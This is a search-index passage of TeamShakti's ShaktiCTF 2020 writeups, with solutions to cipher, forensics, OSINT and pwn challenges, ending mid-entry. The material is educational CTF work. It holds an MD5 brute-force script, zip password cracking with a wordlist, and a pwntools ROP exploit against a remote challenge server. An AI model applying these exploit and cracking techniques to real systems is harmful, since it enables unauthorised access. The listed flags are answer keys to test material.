{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to TeamShakti Writeups Introduction This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensic Analysis Miscellaneous","title":"Welcome to TeamShakti Writeups"},{"location":"#welcome-to-teamshakti-writeups","text":"","title":"Welcome to TeamShakti Writeups"},{"location":"#introduction","text":"This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus .","title":"Introduction"},{"location":"#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensic Analysis Miscellaneous","title":"The contents of this repo"},{"location":"about/","text":"About Us Team Shakti was formed in 2018 when a bunch of passion driven girls from Amria School of Engineering with a vision and a passion driven mentor decided to ' Hack the Stereotypes ', building the country's first women only Capture The Flag team. Mr.Vipin Pavithran had already established a few among the country\u2019s leading student clubs: amFOSS , the student developer\u2019s hub and bi0s , the hackers\u2019 den. There is inadequate representation of women in the field of cybersecurity and TeamShakti was the spark of change. The beginning is always the hardest, and the team had to face its fair share of struggles trying to establish themselves. Due to the efforts of the team and the mentors, the club flourished. Here at TeamShakti, we strive to learn and teach others what we have learnt and that goal fuels our events - ShaktiCTF and ShaktiCon . Team Shakti is characterised by its peer mentoring and the bond of sisterhood that teammates share with each other. Newbies are introduced into the field by the experienced seniors. Overall, we are a group of motivated women who would support and encourage each other while venturing into the cyber world to the best of our possibilities and try to bring about the difference we hope to see in the tech industry where women are highly underpresented. Join Us @ Discord Follow us on Twitter - @TeamShakti Contact Us via mail : shakticon@am.amrita.edu Members @ geethna @ Ashwati Sasi @ sowmya @ Sruthi Dixit @ Ayushi Sharma @ Nimisha Dulgalya @ ph03n1x @ sandrabeme @ Sridevi K @ Namitha S @ Simran Kathpalia","title":"About Us"},{"location":"about/#about-us","text":"Team Shakti was formed in 2018 when a bunch of passion driven girls from Amria School of Engineering with a vision and a passion driven mentor decided to ' Hack the Stereotypes ', building the country's first women only Capture The Flag team. Mr.Vipin Pavithran had already established a few among the country\u2019s leading student clubs: amFOSS , the student developer\u2019s hub and bi0s , the hackers\u2019 den. There is inadequate representation of women in the field of cybersecurity and TeamShakti was the spark of change. The beginning is always the hardest, and the team had to face its fair share of struggles trying to establish themselves. Due to the efforts of the team and the mentors, the club flourished. Here at TeamShakti, we strive to learn and teach others what we have learnt and that goal fuels our events - ShaktiCTF and ShaktiCon . Team Shakti is characterised by its peer mentoring and the bond of sisterhood that teammates share with each other. Newbies are introduced into the field by the experienced seniors. Overall, we are a group of motivated women who would support and encourage each other while venturing into the cyber world to the best of our possibilities and try to bring about the difference we hope to see in the tech industry where women are highly underpresented. Join Us @ Discord Follow us on Twitter - @TeamShakti Contact Us via mail : shakticon@am.amrita.edu","title":"About Us"},{"location":"about/#members","text":"@ geethna @ Ashwati Sasi @ sowmya @ Sruthi Dixit @ Ayushi Sharma @ Nimisha Dulgalya @ ph03n1x @ sandrabeme @ Sridevi K @ Namitha S @ Simran Kathpalia","title":"Members"},{"location":"shaktictf/","text":"Welcome to ShaktiCTF Writeups Introduction ShaktiCTF is a women-only CTF hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . Bringing participants from five major continents(Asia, Europe, Africa, North and South America), the competition aimed to balance the existing gender gap in the field of cybersecurity by hosting a beginner friendly CTF on a women only playground and bringing more feminine power into the field. The competition had 49 challenges in domains ranging from Cryptography, Web Exploitation, Reverse Engineering and Forensics. The contents of this repo This repo contains the writeups of varoius challenges from ShaktiCTF. There are a total of 7 categories we had this year(2020). ShaktiCTF 2020 Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics steganography Miscellaneous ShaktiCTF 2021 Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics Misc","title":"ShaktiCTF"},{"location":"shaktictf/#welcome-to-shaktictf-writeups","text":"","title":"Welcome to ShaktiCTF Writeups"},{"location":"shaktictf/#introduction","text":"ShaktiCTF is a women-only CTF hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . Bringing participants from five major continents(Asia, Europe, Africa, North and South America), the competition aimed to balance the existing gender gap in the field of cybersecurity by hosting a beginner friendly CTF on a women only playground and bringing more feminine power into the field. The competition had 49 challenges in domains ranging from Cryptography, Web Exploitation, Reverse Engineering and Forensics.","title":"Introduction"},{"location":"shaktictf/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from ShaktiCTF. There are a total of 7 categories we had this year(2020).","title":"The contents of this repo"},{"location":"shaktictf/#shaktictf-2020","text":"Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics steganography Miscellaneous","title":"ShaktiCTF 2020"},{"location":"shaktictf/#shaktictf-2021","text":"Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics Misc","title":"ShaktiCTF 2021"},{"location":"ShaktiCTF20/crypto/3-2-1Go/","text":"3,2,1..Go! Author : ph03n1x Description Introducing our theme woman : \"Joan Clarke!\" Cipher : WEQEXFTUXQHVOUFPSVLPTORHAFBQE Looks like I found something I shouldn't have. Seperate the words by underscores('_ Short Writeup Configurations of enigma given. Online solver : https://www.dcode.fr/enigma-machine-cipher Flag : shaktictf{you_have_cracked_the_enigma_genius}","title":"3,2,1..Go!"},{"location":"ShaktiCTF20/crypto/3-2-1Go/#321go","text":"","title":"3,2,1..Go!"},{"location":"ShaktiCTF20/crypto/3-2-1Go/#author-ph03n1x","text":"","title":"Author : ph03n1x"},{"location":"ShaktiCTF20/crypto/3-2-1Go/#description","text":"Introducing our theme woman : \"Joan Clarke!\" Cipher : WEQEXFTUXQHVOUFPSVLPTORHAFBQE Looks like I found something I shouldn't have. Seperate the words by underscores('_","title":"Description"},{"location":"ShaktiCTF20/crypto/3-2-1Go/#short-writeup","text":"Configurations of enigma given. Online solver : https://www.dcode.fr/enigma-machine-cipher Flag : shaktictf{you_have_cracked_the_enigma_genius}","title":"Short Writeup"},{"location":"ShaktiCTF20/crypto/AncientWarfare/","text":"Ancient Warfare Author : ph03n1x Description Do you know how people from Caeser's time used to send encrypted messages? Try to get the flag : funxgvpgs{byq3e_1f_a0g_nyj4lf_gu3_o3gg3e!} Short Writeup Caser's cipher with key of 13 Flag : shaktictf{old3r_1s_n0t_alw4ys_th3_b3tt3r!}","title":"Ancient Warfare"},{"location":"ShaktiCTF20/crypto/AncientWarfare/#ancient-warfare","text":"","title":"Ancient Warfare"},{"location":"ShaktiCTF20/crypto/AncientWarfare/#author-ph03n1x","text":"","title":"Author : ph03n1x"},{"location":"ShaktiCTF20/crypto/AncientWarfare/#description","text":"Do you know how people from Caeser's time used to send encrypted messages? Try to get the flag : funxgvpgs{byq3e_1f_a0g_nyj4lf_gu3_o3gg3e!}","title":"Description"},{"location":"ShaktiCTF20/crypto/AncientWarfare/#short-writeup","text":"Caser's cipher with key of 13 Flag : shaktictf{old3r_1s_n0t_alw4ys_th3_b3tt3r!}","title":"Short Writeup"},{"location":"ShaktiCTF20/crypto/Easyncoding/","text":"Easyncodings Challenge Description Joan feels this text is unbreakable. Prove her wrong by decoding this. 01001110 01111010 01001101 00110010 01001111 01000100 01011001 01111000 01001110 01101101 01001001 00110011 01001110 01000100 01011001 00110101 01001110 01101010 01001101 00110011 01001110 01000100 01011001 00110010 01001110 00110010 01001001 00110001 01001110 01111010 01001101 00110000 01001110 01111010 01001001 00110010 01011010 01000100 01010101 00110001 01001110 01111010 01000001 00110001 01011010 01101010 01010001 01111010 01001110 01101010 01100111 01111010 01001110 01000100 01011010 01101010 01001110 01101101 01001101 01111010 01001101 01111010 01011010 01101100 01001110 01101010 01100011 01111010 01001101 01111010 01100100 01101011 Short writeup Binary decode, Base64 decode, Hex decode Challenge Author 4lph4 Flag shaktictf{W4rmUp_Ch4ll3ng3}","title":"Easyncodings"},{"location":"ShaktiCTF20/crypto/Easyncoding/#easyncodings","text":"","title":"Easyncodings"},{"location":"ShaktiCTF20/crypto/Easyncoding/#challenge-description","text":"Joan feels this text is unbreakable. Prove her wrong by decoding this. 01001110 01111010 01001101 00110010 01001111 01000100 01011001 01111000 01001110 01101101 01001001 00110011 01001110 01000100 01011001 00110101 01001110 01101010 01001101 00110011 01001110 01000100 01011001 00110010 01001110 00110010 01001001 00110001 01001110 01111010 01001101 00110000 01001110 01111010 01001001 00110010 01011010 01000100 01010101 00110001 01001110 01111010 01000001 00110001 01011010 01101010 01010001 01111010 01001110 01101010 01100111 01111010 01001110 01000100 01011010 01101010 01001110 01101101 01001101 01111010 01001101 01111010 01011010 01101100 01001110 01101010 01100011 01111010 01001101 01111010 01100100 01101011","title":"Challenge Description"},{"location":"ShaktiCTF20/crypto/Easyncoding/#short-writeup","text":"Binary decode, Base64 decode, Hex decode","title":"Short writeup"},{"location":"ShaktiCTF20/crypto/Easyncoding/#challenge-author","text":"4lph4","title":"Challenge Author"},{"location":"ShaktiCTF20/crypto/Easyncoding/#flag","text":"shaktictf{W4rmUp_Ch4ll3ng3}","title":"Flag"},{"location":"ShaktiCTF20/crypto/Magic/","text":"Magic Author : ph03n1x Description Sometimes you have to believe in the Magic within you. \u201cI know it's not ordinary. But who ever loved ordinary?\u201d -- Joan Clarke Short Writeup xor with file signature' key = \"w0m3n_p0w3r\" Flag : shaktictf{x0r_aint_secure_if_its_too_short}","title":"Magic"},{"location":"ShaktiCTF20/crypto/Magic/#magic","text":"","title":"Magic"},{"location":"ShaktiCTF20/crypto/Magic/#author-ph03n1x","text":"","title":"Author : ph03n1x"},{"location":"ShaktiCTF20/crypto/Magic/#description","text":"Sometimes you have to believe in the Magic within you. \u201cI know it's not ordinary. But who ever loved ordinary?\u201d -- Joan Clarke","title":"Description"},{"location":"ShaktiCTF20/crypto/Magic/#short-writeup","text":"xor with file signature' key = \"w0m3n_p0w3r\" Flag : shaktictf{x0r_aint_secure_if_its_too_short}","title":"Short Writeup"},{"location":"ShaktiCTF20/crypto/RailMail/","text":"RailMail Challenge Description Joan received a secret mail from her friend, upon looking into it, she found that it contains an encrypted text and sum of key and offset. She is clueless what to do. Help her get the message. Short writeup Challenge based on RailFence cipher. Sum of key and offset is given. Simple bruteforce needs to be done to get actual key and offset. Online tools can be used to solve the same. Challenge Author 4lph4 Flag shaktictf{Aw3s0m3_k33p_Go1n9!}","title":"RailMail"},{"location":"ShaktiCTF20/crypto/RailMail/#railmail","text":"","title":"RailMail"},{"location":"ShaktiCTF20/crypto/RailMail/#challenge-description","text":"Joan received a secret mail from her friend, upon looking into it, she found that it contains an encrypted text and sum of key and offset. She is clueless what to do. Help her get the message.","title":"Challenge Description"},{"location":"ShaktiCTF20/crypto/RailMail/#short-writeup","text":"Challenge based on RailFence cipher. Sum of key and offset is given. Simple bruteforce needs to be done to get actual key and offset. Online tools can be used to solve the same.","title":"Short writeup"},{"location":"ShaktiCTF20/crypto/RailMail/#challenge-author","text":"4lph4","title":"Challenge Author"},{"location":"ShaktiCTF20/crypto/RailMail/#flag","text":"shaktictf{Aw3s0m3_k33p_Go1n9!}","title":"Flag"},{"location":"ShaktiCTF20/crypto/SimpleHash/","text":"SimpleHash Challenge Description The 'Government Code and Cypher School' was founded with a single purpose: that of breaking the German Enigma Code, which they thought to be non-reversible. But later it was broken by her and her team. Hashes are said to be reversible too. Do you think you can reverse this hash though? Short writeup Perform bruteforce attack to get the flag. Length of the flag is only 5 characters, making it easy to brute force. import string import hashlib x = \"cb7a53dd721f4ca90b8fd3dbdabeda5a\".decode(\"hex\") chars = list(string.ascii_lowercase + string.digits) for i in chars: for j in chars: for k in chars: for a in chars: for b in chars: m = hashlib.md5() m.update(\"shaktictf{\" + i+j+k+a+b + \"}\") if m.digest() == x: print \"shaktictf{\" + i+j+k+a+b + \"}\" break Challenge Author 4lph4 Flag shaktictf{sup3r}","title":"SimpleHash"},{"location":"ShaktiCTF20/crypto/SimpleHash/#simplehash","text":"","title":"SimpleHash"},{"location":"ShaktiCTF20/crypto/SimpleHash/#challenge-description","text":"The 'Government Code and Cypher School' was founded with a single purpose: that of breaking the German Enigma Code, which they thought to be non-reversible. But later it was broken by her and her team. Hashes are said to be reversible too. Do you think you can reverse this hash though?","title":"Challenge Description"},{"location":"ShaktiCTF20/crypto/SimpleHash/#short-writeup","text":"Perform bruteforce attack to get the flag. Length of the flag is only 5 characters, making it easy to brute force. import string import hashlib x = \"cb7a53dd721f4ca90b8fd3dbdabeda5a\".decode(\"hex\") chars = list(string.ascii_lowercase + string.digits) for i in chars: for j in chars: for k in chars: for a in chars: for b in chars: m = hashlib.md5() m.update(\"shaktictf{\" + i+j+k+a+b + \"}\") if m.digest() == x: print \"shaktictf{\" + i+j+k+a+b + \"}\" break","title":"Short writeup"},{"location":"ShaktiCTF20/crypto/SimpleHash/#challenge-author","text":"4lph4","title":"Challenge Author"},{"location":"ShaktiCTF20/crypto/SimpleHash/#flag","text":"shaktictf{sup3r}","title":"Flag"},{"location":"ShaktiCTF20/crypto/SimpleRSA/","text":"SimpleRSA Challenge Description Here's the secret message from Joan to you. Break it and Read it. Short writeup Factordb helps in breaking the modulus. Online tools or code can be written to do RSA decryption. from Crypto.Util.number import * # Use an online tool to factorise n. eg: factordb.com p = 724804277 q = 9413710946631053481929229233058876904137902588796220199578081215560027062585806165966619995720300336586922201502376869335302844207978432570013597781850093 #n == p*q c = 484661494807973176484841550022162356056969394230726278907827156279573785417739620605749085238379352332325669223692676583758711843467179784519220209212809010990483 e = 65537 d = inverse(e,(p-1)*(q-1)) m = pow(c,d,p*q) print(long_to_bytes(m)) Challenge Author 4lph4 Flag shaktictf{Gr3a7-g01ng-g1rl-Y4yyy!!}","title":"SimpleRSA"},{"location":"ShaktiCTF20/crypto/SimpleRSA/#simplersa","text":"","title":"SimpleRSA"},{"location":"ShaktiCTF20/crypto/SimpleRSA/#challenge-description","text":"Here's the secret message from Joan to you. Break it and Read it.","title":"Challenge Description"},{"location":"ShaktiCTF20/crypto/SimpleRSA/#short-writeup","text":"Factordb helps in breaking the modulus. Online tools or code can be written to do RSA decryption. from Crypto.Util.number import * # Use an online tool to factorise n. eg: factordb.com p = 724804277 q = 9413710946631053481929229233058876904137902588796220199578081215560027062585806165966619995720300336586922201502376869335302844207978432570013597781850093 #n == p*q c = 484661494807973176484841550022162356056969394230726278907827156279573785417739620605749085238379352332325669223692676583758711843467179784519220209212809010990483 e = 65537 d = inverse(e,(p-1)*(q-1)) m = pow(c,d,p*q) print(long_to_bytes(m))","title":"Short writeup"},{"location":"ShaktiCTF20/crypto/SimpleRSA/#challenge-author","text":"4lph4","title":"Challenge Author"},{"location":"ShaktiCTF20/crypto/SimpleRSA/#flag","text":"shaktictf{Gr3a7-g01ng-g1rl-Y4yyy!!}","title":"Flag"},{"location":"ShaktiCTF20/crypto/XOR/","text":"XOR is Easy Author : ph03n1x Description Joan worked at Bletchley Park in the section known as Hut 8 and quickly became the only female practitioner of Banburismus, a cryptanalytic process developed by Alan Turing to break German ciphers. He came up with the idea when he noticed that every german message ended up with the same word \u201cHeil Hitler!\u201d . In other words the ciphertexts though different, they definitely knew that every text would end with the same plaintext Can you use the analogy to get the flag here? Short Writeup Xoring with known plaintext. Brute forcing one character Flag : shaktictf{X0r_c4n_b3_a_sh4dy_s0m3t1m3s!}","title":"XOR is Easy"},{"location":"ShaktiCTF20/crypto/XOR/#xor-is-easy","text":"","title":"XOR is Easy"},{"location":"ShaktiCTF20/crypto/XOR/#author-ph03n1x","text":"","title":"Author : ph03n1x"},{"location":"ShaktiCTF20/crypto/XOR/#description","text":"Joan worked at Bletchley Park in the section known as Hut 8 and quickly became the only female practitioner of Banburismus, a cryptanalytic process developed by Alan Turing to break German ciphers. He came up with the idea when he noticed that every german message ended up with the same word \u201cHeil Hitler!\u201d . In other words the ciphertexts though different, they definitely knew that every text would end with the same plaintext Can you use the analogy to get the flag here?","title":"Description"},{"location":"ShaktiCTF20/crypto/XOR/#short-writeup","text":"Xoring with known plaintext. Brute forcing one character Flag : shaktictf{X0r_c4n_b3_a_sh4dy_s0m3t1m3s!}","title":"Short Writeup"},{"location":"ShaktiCTF20/crypto/intro/","text":"Cryptography Challenge Name Level Author Concept 3,2,1..Go Easy ph03n1x Enigma Ancient Warfare Easy ph03n1x Caeser Cipher Easyncoding Easy ph03n1x Base Encoding Rail Mail Medium 4lph4 Rail Cipher Magic Medium ph03n1x Xor SimpleRSA Medium 4lph4 RSA factorisation SimpleHash Medium 4lph4 Bruteforce Hash XOR Hard 4lph4 XOR","title":"Cryptography"},{"location":"ShaktiCTF20/crypto/intro/#cryptography","text":"Challenge Name Level Author Concept 3,2,1..Go Easy ph03n1x Enigma Ancient Warfare Easy ph03n1x Caeser Cipher Easyncoding Easy ph03n1x Base Encoding Rail Mail Medium 4lph4 Rail Cipher Magic Medium ph03n1x Xor SimpleRSA Medium 4lph4 RSA factorisation SimpleHash Medium 4lph4 Bruteforce Hash XOR Hard 4lph4 XOR","title":"Cryptography"},{"location":"ShaktiCTF20/forensics/Extract_m3/","text":"Extract M3 Challenge Description We got a clue for a pending criminal case but seems like there was a secret exchange of information among the suspects. Can you help us find what they were sharing so that we can punish the criminals? Short writeup Extract the data from TCP packets where the length of bytes is more than 900 and save it as a new pcapng file. Use scapy to extract the jpg image data from the new pcapng file. from scapy.all import * r=rdpcap('newfile.pcapng') s='' for i in r: s+=i.load open('image.jpg','w').write(s) Extract the zip file using binwalk which is password protected. Use fcrackzip and rockyou.txt to find out the password and open the pdf file. Select the entire file and change the text colour to black to view the flag. Challenge Author v1Ru5 Flag shaktictf{h0p3_y0u_ar3_enj0ying_thi5}","title":"Extract M3"},{"location":"ShaktiCTF20/forensics/Extract_m3/#extract-m3","text":"","title":"Extract M3"},{"location":"ShaktiCTF20/forensics/Extract_m3/#challenge-description","text":"We got a clue for a pending criminal case but seems like there was a secret exchange of information among the suspects. Can you help us find what they were sharing so that we can punish the criminals?","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/Extract_m3/#short-writeup","text":"Extract the data from TCP packets where the length of bytes is more than 900 and save it as a new pcapng file. Use scapy to extract the jpg image data from the new pcapng file. from scapy.all import * r=rdpcap('newfile.pcapng') s='' for i in r: s+=i.load open('image.jpg','w').write(s) Extract the zip file using binwalk which is password protected. Use fcrackzip and rockyou.txt to find out the password and open the pdf file. Select the entire file and change the text colour to black to view the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/forensics/Extract_m3/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/forensics/Extract_m3/#flag","text":"shaktictf{h0p3_y0u_ar3_enj0ying_thi5}","title":"Flag"},{"location":"ShaktiCTF20/forensics/Not_that_easy/","text":"Not That Easy Challenge Description We have intercepted the communication between two criminals and we found that they had shared a secret information. Can you find out the secret? Short writeup There are a set of TCP packets with some data present in their buffer that eventually leads us to the wrong flag. The packet with size 521 bytes begins with file signature -> 89 50 4e 47 0d 0a....which is a PNG image. Extract the image and use zbarimg to view the flag. Challenge Author v1Ru5 Flag shaktictf{sh3_w4s_h0n0r3d_by_3lectr0nic_fr0nti3r_f0und4ti0n}","title":"Not That Easy"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#not-that-easy","text":"","title":"Not That Easy"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#challenge-description","text":"We have intercepted the communication between two criminals and we found that they had shared a secret information. Can you find out the secret?","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#short-writeup","text":"There are a set of TCP packets with some data present in their buffer that eventually leads us to the wrong flag. The packet with size 521 bytes begins with file signature -> 89 50 4e 47 0d 0a....which is a PNG image. Extract the image and use zbarimg to view the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#flag","text":"shaktictf{sh3_w4s_h0n0r3d_by_3lectr0nic_fr0nti3r_f0und4ti0n}","title":"Flag"},{"location":"ShaktiCTF20/forensics/intro/","text":"Forensics Challenge Name Level Author Concept Shark on wire Very Easy v1Ru5 network,wireshark zip zap zoo Easy v1Ru5 zip,file forensics Not that easy Medium v1Ru5 network,wireshark Extract M3 Hard v1Ru5 network,wireshark,scapy","title":"Forensics"},{"location":"ShaktiCTF20/forensics/intro/#forensics","text":"Challenge Name Level Author Concept Shark on wire Very Easy v1Ru5 network,wireshark zip zap zoo Easy v1Ru5 zip,file forensics Not that easy Medium v1Ru5 network,wireshark Extract M3 Hard v1Ru5 network,wireshark,scapy","title":"Forensics"},{"location":"ShaktiCTF20/forensics/shark_on_wire/","text":"Shark on Wire Challenge Description Lara sent me a file which had some hidden message. Help me recover the secret information. Short writeup Follow the TCP stream to see the flag. Challenge Author v1Ru5 Flag shaktictf{wir3sh4rk_i5_ju5t_aw3s0m3}","title":"Shark on Wire"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#shark-on-wire","text":"","title":"Shark on Wire"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#challenge-description","text":"Lara sent me a file which had some hidden message. Help me recover the secret information.","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#short-writeup","text":"Follow the TCP stream to see the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#flag","text":"shaktictf{wir3sh4rk_i5_ju5t_aw3s0m3}","title":"Flag"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/","text":"Zip Zap Zoo File Forensics Author : v1Ru5 Challenge Description We have hidden an important information for you in this file. But remember, it's not always about bruteforcing... Short writeup: Perform 'unzip challenge.zip' to see the password \"h4ckTh35t3R30tyP35\". Extract file.zip and correct the header of the zip file. Open flag.txt using the password and decode the data using any base32 decoder. flag : shaktictf{y4yYYyyY!_Y0u_g0t_1t_409515398}","title":"Zip Zap Zoo"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#zip-zap-zoo","text":"","title":"Zip Zap Zoo"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#file-forensics","text":"Author : v1Ru5","title":"File Forensics"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#challenge-description","text":"We have hidden an important information for you in this file. But remember, it's not always about bruteforcing...","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#short-writeup","text":"Perform 'unzip challenge.zip' to see the password \"h4ckTh35t3R30tyP35\". Extract file.zip and correct the header of the zip file. Open flag.txt using the password and decode the data using any base32 decoder. flag : shaktictf{y4yYYyyY!_Y0u_g0t_1t_409515398}","title":"Short writeup:"},{"location":"ShaktiCTF20/misc/10010101/","text":"10010101 Misc Author : v1Ru5 Challenge Description The story of initial six programmers is not over with them. They are going to recruit a team of fifty scientists to continue working on ENIAC. There are several spots for all of us and for that we need to solve this puzzle.I tried most of the conversions, but this seems to be a different language. I think the text file has something to do with the password of the zip file. Short writeup: Use any online SPOON language decoder to get the password to open the zip file. flag : shaktictf{yEsSsSssssSSS...Sp0oNNn!}","title":"10010101"},{"location":"ShaktiCTF20/misc/10010101/#10010101","text":"","title":"10010101"},{"location":"ShaktiCTF20/misc/10010101/#misc","text":"Author : v1Ru5","title":"Misc"},{"location":"ShaktiCTF20/misc/10010101/#challenge-description","text":"The story of initial six programmers is not over with them. They are going to recruit a team of fifty scientists to continue working on ENIAC. There are several spots for all of us and for that we need to solve this puzzle.I tried most of the conversions, but this seems to be a different language. I think the text file has something to do with the password of the zip file.","title":"Challenge Description"},{"location":"ShaktiCTF20/misc/10010101/#short-writeup","text":"Use any online SPOON language decoder to get the password to open the zip file. flag : shaktictf{yEsSsSssssSSS...Sp0oNNn!}","title":"Short writeup:"},{"location":"ShaktiCTF20/misc/FindMe/","text":"Findme Challenge Description OSINT is popular these days. Kay hid your flag in a social networking website. Go get your flag. Writeup We have a file attached along with the challenge description. On opening the file we see the following: Username: (2c1743a391305fbf367df8e4f069f9f9) + \"x86\" + (987bcab01b929eb2c07877b224215c92) Username didn't work? Try and try. But don't come and \"bash\" me. Description and the contents in the file suggest that the flag has something to do with social networking website. But using the username as it is won't work as the first and last parts are MD5 hashes of the username. The word \"bash\" was simply used to hint that it's a \"hash\". Online tools like crackstation can be used to crack the hashes. Upon cracking the hashes we get words alpha and beta Joining them accordingly gives the username as: alphax86beta Next part is finding the social networking site used. Here's where the description comes into use. Online OSINT tools can be used to find the social networking websites where an user account with the given username exists. namecheckr gives websites with the given username. There are many social networking websites where an user account with the given username exists but Tumblr is the right one. Flag can be found in the description part. Flag shaktictf{H3y!!!0s1nt_pr0} Challenge Author 4lph4","title":"Findme"},{"location":"ShaktiCTF20/misc/FindMe/#findme","text":"","title":"Findme"},{"location":"ShaktiCTF20/misc/FindMe/#challenge-description","text":"OSINT is popular these days. Kay hid your flag in a social networking website. Go get your flag.","title":"Challenge Description"},{"location":"ShaktiCTF20/misc/FindMe/#writeup","text":"We have a file attached along with the challenge description. On opening the file we see the following: Username: (2c1743a391305fbf367df8e4f069f9f9) + \"x86\" + (987bcab01b929eb2c07877b224215c92) Username didn't work? Try and try. But don't come and \"bash\" me. Description and the contents in the file suggest that the flag has something to do with social networking website. But using the username as it is won't work as the first and last parts are MD5 hashes of the username. The word \"bash\" was simply used to hint that it's a \"hash\". Online tools like crackstation can be used to crack the hashes. Upon cracking the hashes we get words alpha and beta Joining them accordingly gives the username as: alphax86beta Next part is finding the social networking site used. Here's where the description comes into use. Online OSINT tools can be used to find the social networking websites where an user account with the given username exists. namecheckr gives websites with the given username. There are many social networking websites where an user account with the given username exists but Tumblr is the right one. Flag can be found in the description part.","title":"Writeup"},{"location":"ShaktiCTF20/misc/FindMe/#flag","text":"shaktictf{H3y!!!0s1nt_pr0}","title":"Flag"},{"location":"ShaktiCTF20/misc/FindMe/#challenge-author","text":"4lph4","title":"Challenge Author"},{"location":"ShaktiCTF20/misc/Wooooww/","text":"Wooooww Misc Author : v1Ru5 Challenge Description Some terrorists implanted a spy microphone in our office and tried sending some important project details to their country. The ENIAC programmers caught that and we need your help to extract the secret message. Flag format : shaktictf{STRING} Short writeup: Ignore other tones and decode the morse part of the mp3 file to get the flag. flag : shaktictf{LOLM0RS3I5FUNN}","title":"Wooooww"},{"location":"ShaktiCTF20/misc/Wooooww/#wooooww","text":"","title":"Wooooww"},{"location":"ShaktiCTF20/misc/Wooooww/#misc","text":"Author : v1Ru5","title":"Misc"},{"location":"ShaktiCTF20/misc/Wooooww/#challenge-description","text":"Some terrorists implanted a spy microphone in our office and tried sending some important project details to their country. The ENIAC programmers caught that and we need your help to extract the secret message. Flag format : shaktictf{STRING}","title":"Challenge Description"},{"location":"ShaktiCTF20/misc/Wooooww/#short-writeup","text":"Ignore other tones and decode the morse part of the mp3 file to get the flag. flag : shaktictf{LOLM0RS3I5FUNN}","title":"Short writeup:"},{"location":"ShaktiCTF20/misc/emojicode/","text":"Emoji-gram Writeup The idea of this challenge was to make you write a small python program that could decode the encrypted emoji encoded text Script import emojicode emojicode.decrypt('[THE EMOJI STRING]')","title":"Emoji-gram"},{"location":"ShaktiCTF20/misc/emojicode/#emoji-gram","text":"","title":"Emoji-gram"},{"location":"ShaktiCTF20/misc/emojicode/#writeup","text":"The idea of this challenge was to make you write a small python program that could decode the encrypted emoji encoded text","title":"Writeup"},{"location":"ShaktiCTF20/misc/emojicode/#script","text":"import emojicode emojicode.decrypt('[THE EMOJI STRING]')","title":"Script"},{"location":"ShaktiCTF20/misc/intro/","text":"Misc Challenge Name Level Author Concept Emojicode Easy 4lex1 misc Wooooww Easy v1Ru5 audio,morse 10010101 Medium v1Ru5 esolang FindME Medium 4lph4 hash cracking, OSINT","title":"Misc"},{"location":"ShaktiCTF20/misc/intro/#misc","text":"Challenge Name Level Author Concept Emojicode Easy 4lex1 misc Wooooww Easy v1Ru5 audio,morse 10010101 Medium v1Ru5 esolang FindME Medium 4lph4 hash cracking, OSINT","title":"Misc"},{"location":"ShaktiCTF20/pwning/adventure_chain/","text":"Adventure Chain Challenge Author b3y0nd3r Challenge Description Kathleen is on her next adventure, which marked her name in history of Computer Science forever. Looks like the pieces of her ARC code seem to be brewing something notorious. Follow the chains which might lead you to a hideous place where you can claim your mastery and discover the unintended invention Short writeup Use ROPgadgets to bypass the argument checks and finally call the function which reads flag.txt. from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',4444) p.sendlineafter(\">> \",\"1\") pop_rdi = p64(0x0000000000400a93) pop_rsi_r15 = p64(0x0000000000400a91) assert_ = p64(0x00000000004007d7) setValue = p64(0x00000000004007ec) flag = p64(0x000000000040082c) #exp = \"a\"*56 + auth + pop_rdi + p64(0xdeadbeef) + add_bal + pop_rdi + p64(0xba5eba11) + pop_rsi_r15 + p64(0xbedabb1e) + p64(0xbedabb1e) + flag exp = \"a\"*40 exp += assert_ exp += pop_rdi + p64(0xdeadbeef) exp += setValue exp += pop_rdi + p64(0xdeadc0de) exp += pop_rsi_r15 + p64(0xdead10cc) + \"a\"*8 exp += flag #gdb.attach(p) p.sendlineafter(\"Enter your name:\",exp) p.interactive() Flag shaktictf{r0pe_climbing_chaining_1337_way}","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/adventure_chain/#adventure-chain","text":"","title":"Adventure Chain"},{"location":"ShaktiCTF20/pwning/adventure_chain/#challenge-author","text":"b3y0nd3r","title":"Challenge 